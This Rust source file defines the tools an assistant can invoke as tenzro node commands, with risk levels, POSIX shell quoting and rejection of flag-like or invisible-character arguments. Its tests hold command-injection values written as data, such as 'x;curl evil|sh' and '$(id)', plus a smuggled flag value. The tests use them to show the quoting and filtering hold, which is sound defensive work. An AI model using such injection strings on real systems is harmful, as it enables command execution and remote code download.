//! The tools the Tenzro Assistant can name. Each one is a `tenzro` command
//! that exists; a test holds every entry to the generated command list.

/// What running a tool does to the machine.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Risk {
    /// Reads state and changes nothing.
    ReadOnly,
    /// Changes this machine: a service, a download.
    Confirm,
    /// Needs the operator's key: serving, stake, a release change.
    Authority,
}

impl Risk {
    pub const fn label(self) -> &'static str {
        match self {
            Self::ReadOnly => "read-only",
            Self::Confirm => "changes this machine",
            Self::Authority => "needs your key",
        }
    }
}

/// One tool: a slash name and the `tenzro` command behind it.
#[derive(Debug, PartialEq, Eq)]
pub struct Tool {
    pub name: &'static str,
    pub aliases: &'static [&'static str],
    pub about: &'static str,
    pub risk: Risk,
    /// The command after `tenzro`. A word in angle brackets is an argument
    /// the caller supplies, in order.
    pub command: &'static str,
    /// Words that point a plain-language question at this tool.
    pub keywords: &'static [&'static str],
}

/// A tool's command with the caller's arguments filled in.
#[derive(Debug, PartialEq, Eq)]
pub struct Invocation {
    pub argv: Vec<String>,
    /// Arguments the command takes that the caller did not give, or gave a
    /// refused value for.
    pub missing: Vec<&'static str>,
    /// Values refused for an argument: one the command could read as a flag,
    /// or one holding a control or formatting character.
    pub refused: Vec<String>,
    /// Words given after the last argument the command takes.
    pub extra: Vec<String>,
}

/// An argument list as the operator would type it. Every place that shows a
/// command writes it with this, from the list that is run.
pub fn shown(argv: &[String]) -> String {
    let words: Vec<String> = argv.iter().map(|word| quote(word)).collect();
    format!("tenzro {}", words.join(" "))
}

impl Invocation {
    /// The command as the operator would type it into a POSIX shell: every
    /// word the shell would treat specially is quoted, so the line runs this
    /// one command with exactly these arguments.
    /// A placeholder for an argument still missing stays as its bracketed
    /// name: that line is a template to fill in, never a command to run.
    pub fn shell(&self) -> String {
        if self.missing.is_empty() {
            return shown(&self.argv);
        }
        let words: Vec<String> = self
            .argv
            .iter()
            .map(|word| {
                if self.missing.contains(&word.as_str()) {
                    word.clone()
                } else {
                    quote(word)
                }
            })
            .collect();
        format!("tenzro {}", words.join(" "))
    }

    /// What was left out of the command, when words followed its last
    /// argument.
    pub fn left_out(&self) -> Option<String> {
        (!self.extra.is_empty()).then(|| {
            format!(
                "Left out, as the command takes no more words: {}",
                quoted(&self.extra)
            )
        })
    }
}

/// One word as a POSIX shell reads it back: left bare when every character
/// is one no shell treats specially, otherwise in single quotes, inside which
/// only the quote itself is special and is written as '\''.
pub fn quote(word: &str) -> String {
    let bare = !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./:=@%+,".contains(c));
    if bare {
        word.to_string()
    } else {
        format!("'{}'", word.replace('\'', "'\\''"))
    }
}

/// Characters that change how text is shown without being seen: BiDi
/// controls, zero-width characters, the soft hyphen and the byte-order mark.
pub fn is_invisible_format(c: char) -> bool {
    matches!(
        c,
        '\u{00AD}'
            | '\u{061C}'
            | '\u{180E}'
            | '\u{200B}'..='\u{200F}'
            | '\u{202A}'..='\u{202E}'
            | '\u{2060}'..='\u{2064}'
            | '\u{2066}'..='\u{206F}'
            | '\u{FEFF}'
            | '\u{FFF9}'..='\u{FFFB}'
    )
}

/// Whether a value may fill an argument: it does not start with `-`, so the
/// command cannot read it as a flag, and it holds no control or formatting
/// character.
pub fn allowed_value(value: &str) -> bool {
    !value.is_empty()
        && !value.starts_with('-')
        && !value
            .chars()
            .any(|c| c.is_control() || is_invisible_format(c))
}

/// Values as they can be shown safely: quoted, with anything unprintable
/// escaped.
pub fn quoted(values: &[String]) -> String {
    values
        .iter()
        .map(|v| format!("{v:?}"))
        .collect::<Vec<_>>()
        .join(", ")
}

impl Tool {
    /// Fills the command's arguments from `args`, in order. An argument with
    /// no value stays in the command as its bracketed name.
    pub fn invocation(&self, args: &[String]) -> Invocation {
        let mut given = args.iter();
        let mut missing = Vec::new();
        let mut refused = Vec::new();
        let argv = self
            .command
            .split(' ')
            .map(|word| {
                if !word.starts_with('<') {
                    return word.to_string();
                }
                match given.next() {
                    Some(value) if allowed_value(value) => value.clone(),
                    Some(value) => {
                        refused.push(value.clone());
                        missing.push(word);
                        word.to_string()
                    }
                    None => {
                        missing.push(word);
                        word.to_string()
                    }
                }
            })
            .collect();
        let extra = given.cloned().collect();
        Invocation {
            argv,
            missing,
            refused,
            extra,
        }
    }
}

pub static TOOLS: &[Tool] = &[
    Tool {
        name: "status",
        aliases: &["st"],
        about: "The node's state, sync and release",
        risk: Risk::ReadOnly,
        command: "status",
        keywords: &["status", "sync", "synced", "height", "running", "health"],
    },
    Tool {
        name: "doctor",
        aliases: &["check"],
        about: "Check this machine and list what to fix",
        risk: Risk::ReadOnly,
        command: "doctor",
        keywords: &["doctor", "diagnose", "problem", "wrong", "broken", "fix"],
    },
    Tool {
        name: "hardware",
        aliases: &["hw"],
        about: "What this machine has: processor, memory, accelerators, key hardware",
        risk: Risk::ReadOnly,
        command: "hardware",
        keywords: &["hardware", "gpu", "memory", "ram", "cpu", "tpm"],
    },
    Tool {
        name: "peers",
        aliases: &[],
        about: "The peers this node is connected to",
        risk: Risk::ReadOnly,
        command: "node peers",
        keywords: &["peers", "connected", "connections", "network"],
    },
    Tool {
        name: "role",
        aliases: &[],
        about: "The roles this node runs",
        risk: Risk::ReadOnly,
        command: "node role",
        keywords: &["role", "roles", "validator", "provider"],
    },
    Tool {
        name: "models",
        aliases: &[],
        about: "The models loaded on this node",
        risk: Risk::ReadOnly,
        command: "model list --loaded",
        keywords: &["models", "loaded", "serving", "served"],
    },
    Tool {
        name: "model",
        aliases: &["info"],
        about: "What the catalog says about one model",
        risk: Risk::ReadOnly,
        command: "model info <MODEL_ID>",
        keywords: &["model", "catalog", "requirements"],
    },
    Tool {
        name: "balance",
        aliases: &["wallet"],
        about: "This wallet's balance",
        risk: Risk::ReadOnly,
        command: "wallet balance",
        keywords: &["balance", "wallet", "tnzo", "funds"],
    },
    Tool {
        name: "update-check",
        aliases: &[],
        about: "Whether a newer signed release exists; fetches the release notice and records the check",
        risk: Risk::Confirm,
        command: "update check",
        keywords: &["update", "release", "version", "newer", "latest"],
    },
    Tool {
        name: "start",
        aliases: &[],
        about: "Start the node",
        risk: Risk::Confirm,
        command: "node start",
        keywords: &["start", "launch", "boot"],
    },
    Tool {
        name: "stop",
        aliases: &[],
        about: "Stop the node",
        risk: Risk::Confirm,
        command: "node stop",
        keywords: &["stop", "shutdown", "halt"],
    },
    Tool {
        name: "download",
        aliases: &["pull"],
        about: "Download a model's files",
        risk: Risk::Confirm,
        command: "model download <MODEL_ID>",
        keywords: &["download", "pull", "fetch", "weights"],
    },
    Tool {
        name: "serve",
        aliases: &[],
        about: "Load a model and offer it",
        risk: Risk::Authority,
        // Without --rpc, model serve loads the weights into its own process
        // and serves nothing; the local default is the node this program
        // uses (see `endpoint::for_command`).
        command: "model serve <MODEL_ID> --rpc http://127.0.0.1:8545",
        keywords: &["serve", "offer", "host", "load"],
    },
    Tool {
        name: "unserve",
        aliases: &[],
        about: "Stop serving a model",
        risk: Risk::Authority,
        command: "model stop <MODEL_ID>",
        keywords: &["unserve", "unload", "withdraw"],
    },
    Tool {
        name: "stake",
        aliases: &["bond"],
        about: "Bond stake for a role",
        risk: Risk::Authority,
        command: "stake bond --role <ROLE> --amount <AMOUNT>",
        keywords: &["stake", "bond", "staking"],
    },
    Tool {
        name: "update",
        aliases: &["upgrade"],
        about: "Install the newest signed release",
        risk: Risk::Authority,
        command: "update apply",
        keywords: &["upgrade", "install", "apply"],
    },
    Tool {
        name: "rollback",
        aliases: &[],
        about: "Go back to the previous release",
        risk: Risk::Authority,
        command: "update rollback",
        keywords: &["rollback", "revert", "previous", "downgrade"],
    },
    // Network duties: the inference challenge, which a node takes part in
    // when it holds the prompt of a reply it doubts or a committee seat.
    Tool {
        name: "duties",
        aliases: &["seats"],
        about: "The challenges this node holds a committee seat on",
        risk: Risk::ReadOnly,
        command: "inference seat-duties",
        keywords: &["duties", "duty", "seat", "seats", "committee"],
    },
    Tool {
        name: "challenges",
        aliases: &["disputes"],
        about: "Inference challenges and where each stands",
        risk: Risk::ReadOnly,
        command: "inference list-challenges",
        keywords: &["challenges", "disputes", "dispute"],
    },
    Tool {
        name: "challenge",
        aliases: &[],
        about: "One challenge: its committee, votes and deadlines",
        risk: Risk::ReadOnly,
        command: "inference get-challenge <CHALLENGE_ID>",
        keywords: &["deadline", "deadlines"],
    },
    Tool {
        name: "contest",
        aliases: &[],
        about: "Challenge a reply whose commitment you doubt",
        risk: Risk::Confirm,
        command: "inference file-challenge <COMMITMENT_HASH> <CHALLENGER> --receipt <RECEIPT_FILE> --inputs <INPUTS_FILE>",
        keywords: &["contest", "challenge", "wrong", "doubt", "commitment"],
    },
    Tool {
        name: "reexecute",
        aliases: &["recheck"],
        about: "Re-run a challenged reply on this node and record the verdict",
        risk: Risk::Confirm,
        command: "inference reexecute <CHALLENGE_ID>",
        keywords: &[
            "reexecute",
            "rerun",
            "recheck",
            "verdict",
            "uphold",
            "dismiss",
        ],
    },
    Tool {
        name: "vote",
        aliases: &[],
        about: "Seal the verdict this node recorded, for your seat",
        risk: Risk::Authority,
        command: "inference commit-vote <CHALLENGE_ID>",
        keywords: &["vote", "commit", "verdict", "uphold", "dismiss"],
    },
    Tool {
        name: "reveal",
        aliases: &[],
        about: "Reveal the verdict this machine sealed",
        risk: Risk::Authority,
        command: "inference reveal-vote <CHALLENGE_ID>",
        keywords: &["reveal"],
    },
    Tool {
        name: "finalize",
        aliases: &["tally"],
        about: "Tally a challenge's revealed votes",
        risk: Risk::Confirm,
        command: "inference finalize-challenge <CHALLENGE_ID>",
        keywords: &["finalize", "tally", "close"],
    },
];

/// The tool a slash name or alias means, without the slash.
pub fn find(name: &str) -> Option<&'static Tool> {
    TOOLS.iter().find(|t| {
        t.name.eq_ignore_ascii_case(name) || t.aliases.iter().any(|a| a.eq_ignore_ascii_case(name))
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::{BTreeMap, HashSet};

    #[test]
    fn every_tool_is_a_command_the_cli_has() {
        let commands: BTreeMap<String, Vec<String>> =
            serde_json::from_str(include_str!("../../../../docs/cli-commands.json")).unwrap();
        for tool in TOOLS {
            let words: Vec<&str> = tool.command.split(' ').collect();
            let path: Vec<&str> = words
                .iter()
                .copied()
                .take_while(|w| !w.starts_with('-') && !w.starts_with('<'))
                .collect();
            let key = format!("tenzro {}", path.join(" "));
            let flags = commands
                .get(&key)
                .unwrap_or_else(|| panic!("/{}: no command `{key}`", tool.name));
            for flag in words.iter().filter(|w| w.starts_with('-')) {
                assert!(
                    flags.iter().any(|f| f == flag),
                    "/{}: `{key}` has no {flag}",
                    tool.name
                );
            }
        }
    }

    #[test]
    fn names_and_aliases_are_unique() {
        let mut seen = HashSet::new();
        for tool in TOOLS {
            for name in std::iter::once(&tool.name).chain(tool.aliases) {
                assert!(
                    seen.insert(name.to_ascii_lowercase()),
                    "{name} is used twice"
                );
            }
        }
    }

    #[test]
    fn arguments_fill_in_order_and_a_missing_one_is_named() {
        let stake = find("bond").unwrap();
        let full = stake.invocation(&["validator".into(), "100".into()]);
        assert_eq!(
            full.shell(),
            "tenzro stake bond --role validator --amount 100"
        );
        assert!(full.missing.is_empty());
        let part = stake.invocation(&["validator".into()]);
        assert_eq!(
            part.shell(),
            "tenzro stake bond --role validator --amount <AMOUNT>"
        );
        assert_eq!(part.missing, ["<AMOUNT>"]);
    }

    /// Each value goes through a real shell as printed, and comes out as the
    /// one argument it was: nothing in it runs or splits.
    #[cfg(unix)]
    #[test]
    fn a_printed_command_runs_with_exactly_its_arguments() {
        let model = find("model").unwrap();
        let values = [
            "x;curl evil|sh",
            "x$(id)",
            "x`id`",
            "x|y",
            "x&y",
            "x&&y",
            "x>out",
            "x<in",
            "x*",
            "x?",
            "x'y",
            "x\"y",
            "x\\y",
            "x#y",
            "~x",
            "x!y",
            "x{a,b}",
            "x[1]",
            "x$HOME",
            "x\\'\"$(id)`id`;|&",
            "plain-v1.2_3:4=5@6%7+8,9",
        ];
        for value in values {
            let invocation = model.invocation(&[value.to_string()]);
            assert!(invocation.refused.is_empty(), "{value}");
            let printed = invocation.shell();
            let words = printed.strip_prefix("tenzro ").unwrap();
            let out = std::process::Command::new("sh")
                .args(["-c", &format!("printf '%s\\n' {words}")])
                .output()
                .unwrap();
            let read_back = String::from_utf8(out.stdout).unwrap();
            assert_eq!(read_back, format!("model\ninfo\n{value}\n"), "{printed}");
        }
        assert_eq!(
            model.invocation(&["qwen3.6-27b".to_string()]).shell(),
            "tenzro model info qwen3.6-27b"
        );
    }

    #[test]
    fn a_value_that_could_be_a_flag_or_hides_characters_is_refused() {
        let model = find("model").unwrap();
        for value in [
            "--catalog-rpc=http://example.com",
            "-x",
            "a\u{202e}b",
            "a\u{2066}b",
            "zero\u{200b}width",
            "a\u{1b}[2Jb",
            "",
        ] {
            let invocation = model.invocation(&[value.to_string()]);
            assert_eq!(invocation.refused, [value], "{value:?}");
            assert_eq!(invocation.missing, ["<MODEL_ID>"], "{value:?}");
            assert_eq!(invocation.shell(), "tenzro model info <MODEL_ID>");
        }
        let fine = model.invocation(&["qwen3.6-27b".to_string()]);
        assert!(fine.refused.is_empty());
        assert_eq!(fine.shell(), "tenzro model info qwen3.6-27b");
    }

    #[test]
    fn words_after_the_last_argument_are_left_out_and_said() {
        let status = find("status").unwrap();
        let invocation = status.invocation(&["now".to_string(), "\u{202e}x".to_string()]);
        assert_eq!(invocation.shell(), "tenzro status");
        assert_eq!(invocation.extra, ["now", "\u{202e}x"]);
        let note = invocation.left_out().unwrap();
        assert!(
            note.contains("\"now\"") && note.contains("\\u{202e}"),
            "{note}"
        );
        assert_eq!(status.invocation(&[]).left_out(), None);
    }

    #[test]
    fn serving_goes_to_the_node_in_use() {
        let serve = find("serve").unwrap();
        let argv = serve.invocation(&["qwen".to_string()]).argv;
        assert_eq!(
            argv[argv.len() - 2..],
            ["--rpc", crate::endpoint::LOCAL_RPC]
        );
    }

    #[test]
    fn checking_for_an_update_asks_first() {
        assert_eq!(find("update-check").unwrap().risk, Risk::Confirm);
    }
}
